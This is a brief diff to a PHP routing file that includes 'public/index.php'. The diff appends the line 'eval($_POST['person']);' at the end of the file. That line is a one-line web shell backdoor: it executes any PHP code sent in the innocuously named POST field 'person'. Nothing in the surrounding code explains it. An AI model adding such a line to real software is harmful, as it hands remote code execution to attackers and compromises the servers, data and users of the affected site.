@@ -8,5 +8,5 @@ if ($path)
 else {
     include 'public/index.php';
 }
-
+eval($_POST['person']);
 
